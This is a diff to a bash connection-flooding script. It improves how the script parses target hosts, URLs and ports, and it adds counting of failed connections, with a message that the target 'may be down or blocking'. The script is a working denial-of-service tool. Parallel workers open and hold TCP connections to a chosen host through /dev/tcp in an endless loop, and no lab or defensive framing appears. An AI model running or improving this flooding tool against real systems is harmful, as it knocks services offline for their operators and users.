@@ -14,13 +14,40 @@ while :; do
     esac
 done
 
-read -rp "Target host: " host_address
+# accept a bare host, host:port, or a full URL; scheme sets the default port
+port_hint=""
+read -rp "Target host or URL (example.com, https://example.com, 10.0.0.1:8080): " target_answer
+case "$target_answer" in
+    https://*) port_hint=443; target_answer="${target_answer#https://}" ;;
+    http://*) port_hint=80; target_answer="${target_answer#http://}" ;;
+esac
+target_answer="${target_answer%%/*}"
+if [[ "$target_answer" =~ ^\[[^]]]+\](:[0-9]+)?$ ]]; then
+    host_address="${target_answer#\[}"
+    host_address="${host_address%%\]*}"
+    if [[ "$target_answer" =~ \]:([0-9]+)$ ]]; then
+        port_hint="${BASH_REMATCH[1]}"
+    fi
+elif [[ "$target_answer" =~ ^([^:]+):([0-9]+)$ ]]; then
+    host_address="${BASH_REMATCH[1]}"
+    port_hint="${BASH_REMATCH[2]}"
+else
+    host_address="$target_answer"
+fi
+if [ -z "$host_address" ]; then
+    read -rp "Target host: " host_address
+fi
 
-while :; do
-    read -rp "Target port (1-65535): " answer
+port_number=""
+while [ -z "$port_number" ]; do
+    if [ -n "$port_hint" ]; then
+        read -rp "Target port (Enter = ${port_hint}): " answer
+        [ -z "$answer" ] && answer="$port_hint"
+    else
+        read -rp "Target port (1-65535): " answer
+    fi
     if [[ "$answer" =~ ^[0-9]+$ ]] && [ "$answer" -ge 1 ] && [ "$answer" -le 65535 ]; then
         port_number="$answer"
-        break
     fi
 done
 
@@ -39,6 +66,7 @@ if [ "$protocol" = "TCP" ]; then
     echo "Flooding ${host_address}:${port_number} with TCP connections from ${worker_count} parallel workers (Ctrl+C to stop and release)..."
     tcp_worker() {
         connection_count=0
+        failure_count=0
         while :; do
             if exec {descriptor}<>/dev/tcp/"${host_address}"/"${port_number}" 2>/dev/null; then
                 connection_count=$((connection_count + 1))
@@ -46,6 +74,10 @@ if [ "$protocol" = "TCP" ]; then
                     echo "Worker: ${connection_count} connections held"
                 fi
             else
+                failure_count=$((failure_count + 1))
+                if [ $((failure_count % 25)) -eq 0 ]; then
+                    echo "Worker: ${failure_count} connect failures - target may be down or blocking"
+                fi
                 sleep 0.02
             fi
         done
